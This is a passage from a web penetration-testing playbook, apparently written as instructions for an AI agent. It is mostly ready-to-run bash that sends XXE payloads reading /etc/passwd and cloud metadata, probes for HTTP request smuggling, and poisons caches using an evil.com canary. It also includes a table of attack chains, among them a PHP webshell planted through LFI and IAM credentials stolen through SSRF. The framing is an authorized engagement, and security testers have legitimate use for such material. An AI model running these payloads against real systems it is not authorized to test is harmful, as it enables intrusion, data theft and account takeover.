    -H "Authorization: Bearer $TOKEN" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>' | head -20

# SVG-based XXE (for image upload endpoints)
cat > /tmp/xxe_test.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/xxe_test.svg;type=image/svg+xml" | grep -E "root:|daemon:|nobody:" | head -5
```

---

### Parameter Discovery

```bash
TARGET=<target>
TOKEN=<token>
ENDPOINT=<endpoint>
ENG=/home/kali/current

arjun -u "https://$TARGET/$ENDPOINT" -m GET \
    -H "Authorization: Bearer $TOKEN" \
    --output-file $ENG/scans/ffuf/arjun_get.json 2>/dev/null | tail -15

arjun -u "https://$TARGET/$ENDPOINT" -m POST \
    -H "Authorization: Bearer $TOKEN" \
    --output-file $ENG/scans/ffuf/arjun_post.json 2>/dev/null | tail -15
```

---

### Endpoint Fuzzing

```bash
TARGET=<target>
TOKEN=<token>
ENG=/home/kali/current

# API endpoint discovery
ffuf -u "https://$TARGET/api/FUZZ" \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt \
    -H "Authorization: Bearer $TOKEN" \
    -mc 200,201,204,301,302,401,403 -ac \
    -o $ENG/scans/ffuf/api_fuzz.json 2>/dev/null | tail -20

# Version path fuzzing
ffuf -u "https://$TARGET/FUZZ/users" \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -H "Authorization: Bearer $TOKEN" \
    -mc 200,201,204,301,302,401,403 -ac 2>/dev/null | tail -15
```

---

### HTTP Request Smuggling

**Trigger**: TE+CL headers both present in response, reverse proxy in front (nginx, HAProxy, Cloudflare), or TE variants accepted.

```bash
TARGET_URL=<full_url_with_scheme>

# Install smuggler if not present
[ -f /opt/smuggler/smuggler.py ] || git clone https://github.com/defparam/smuggler.git /opt/smuggler/ 2>/dev/null

# Automated detection — all CL.TE / TE.CL / TE.TE variants
timeout 60 python3 /opt/smuggler/smuggler.py -u "$TARGET_URL" -t 15 -m POST 2>/dev/null | \
    grep -E "Issue|Vulnerable|CLTE|TECL|timeout" | head -10

# Manual CL.TE timing probe (>4s delay = vulnerable)
TIME=$(curl -sk -X POST "$TARGET_URL" \
    -H "Transfer-Encoding: chunked" -H "Content-Length: 6" \
    --data-binary $'3\r\nabc\r\nX' --max-time 8 -o /dev/null -w "%{time_total}" 2>/dev/null)
echo "CL.TE probe time: ${TIME}s (>4.5s = likely vulnerable)"
```

**Impact gate**: Timing anomaly confirmed OR smuggler reports vulnerability → run `/pt-web` for full exploitation. Impact is always Critical — smuggling enables WAF bypass, session theft, and response cache poisoning.

**Chain check**: HTTP smuggling + cache layer → Web Cache Poisoning for all users.

---

### Web Cache Poisoning

**Trigger**: `X-Cache: HIT` / `Age:` header in response, CDN present, X-Forwarded-Host reflected in body or Location.

```bash
TARGET_URL=<full_url_with_scheme>

CANARY="pt-probe-$(date +%s)"

# Test unkeyed header injection — does X-Forwarded-Host reach origin and get reflected?
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
    RESP=$(curl -sk -H "$header: $CANARY.evil.com" "$TARGET_URL" 2>/dev/null)
    if echo "$RESP" | grep -q "$CANARY"; then
        echo "[CACHE POISON CANDIDATE] $header reflected in body"
        # Verify: request again WITHOUT the header — still present? Cache hit = confirmed
        RESP2=$(curl -sk "$TARGET_URL" 2>/dev/null)
        echo "$RESP2" | grep -q "$CANARY" && echo "  [CONFIRMED] Canary in cache — poisoned response served to all users!"
    fi
done

# Cache deception — append static extensions to account pages
for path in /account /profile /dashboard /settings; do
    for ext in .css .js .png; do
        RESP=$(curl -sk "$TARGET_URL$path$ext" 2>/dev/null)
        echo "$RESP" | grep -qiE "email|username|user_id|balance|order" && \
            echo "[CACHE DECEPTION] $TARGET_URL$path$ext returns account data"
    done
done
```

**Impact gate**: Canary reflected AND present in second uncached request → confirmed cache poisoning. Severity: High (XSS impact when reflected in HTML) to Critical (account data exposed in cache deception).

---

## Step 2.5 — Chain Exploitation (apply when 2+ findings confirmed)

Before final documentation, check if any confirmed findings can be chained:

| Finding combination | Chain attack | Result |
|--------------------|-------------|--------|
| IDOR + JWT claim tamper | Change JWT `user_id` claim → access that user's IDOR endpoints | Full account takeover |
| SSRF + Internal CORS | Use SSRF to reach internal API that trusts Origin header → exfiltrate via JS | Data exfiltration |
| Mass assignment (role=admin) + any HIGH vector | Re-run all HIGH vectors as admin | Critical privilege escalation |
| LFI + file upload | Upload PHP webshell → include via LFI path | RCE |
| SSRF + cloud metadata | Read IAM creds from 169.254.169.254 → AWS/GCP API calls | Cloud account takeover |
| SQLi + weak hashes | Dump password hashes → crack with hashcat | Credential compromise |
| Error disclosure (DB type) + input param | Targeted SQLi with confirmed DB engine | More efficient exploitation |

Document chains as a single critical finding combining the individual CVSSes.

---

## Step 3 — Impact Gate (apply after EVERY result)

Before moving to the next vector, verify:

1. **Another user's data in response?** → IDOR / BOLA confirmed
2. **Elevated role or privileges granted?** → Privilege escalation confirmed
3. **Server made outbound HTTP request you controlled?** → SSRF confirmed
4. **Mathematical expression evaluated (`49`, `7777777`)?** → SSTI confirmed
5. **SQL rows or schema returned?** → SQLi confirmed
6. **Modified JWT accepted at higher privilege?** → JWT vulnerability confirmed
7. **NoSQL operator in auth response returned data without correct password?** → NoSQL injection confirmed
8. **Null/evil.com origin reflected with credentials allowed?** → CORS misconfiguration confirmed
9. **Prototype pollution reflected in subsequent response?** → Prototype pollution confirmed

**Only document confirmed impact.** HTTP 200 alone is not a finding.

---

## Step 4 — Document Confirmed Findings

For every confirmed finding, save evidence and update notes:

```bash
FINDING=<short_snake_case_name>  # e.g. idor_user_profile, cors_api_endpoint
SEVERITY=<Critical|High|Medium|Low>
CVSS=<score>  # Critical=9+, High=7-8.9, Medium=4-6.9, Low=0.1-3.9
ENG=/home/kali/current

# Save raw PoC (request + response)
curl -v -sk ... 2>&1 | tee $ENG/poc/requests/${FINDING}.txt

# Append to engagement notes
cat >> $ENG/notes/engagement.md << EOF

---
## Finding: $FINDING
**Severity**: $SEVERITY
**CVSS**: $CVSS
**Endpoint**:
**Parameter**:
**Description**:
**Impact**:
**PoC**: poc/requests/${FINDING}.txt
**Remediation**:
**Date**: $(date +%Y-%m-%d)
EOF

echo "[documented] $FINDING → $ENG/notes/engagement.md"
```

---

## Execution Rules

- **Read Step 0 first** — never attack without knowing what's already been confirmed
- **Justify every vector** — one sentence of reasoning before each tool run
- **One vector at a time** — run, interpret, impact gate, then move on
- **SSTI: use grep exit code** — never use `[ -n '$result' ]` in single-quoted context
- **Chain check after every 2 confirmed findings** — medium + medium often = critical
- **Present findings in plain language** — not raw JSON dumps
- **Save PoC immediately** on confirmation — don't wait
- **Never run sqlmap/hydra/ffuf blind** — only if you saw a specific signal
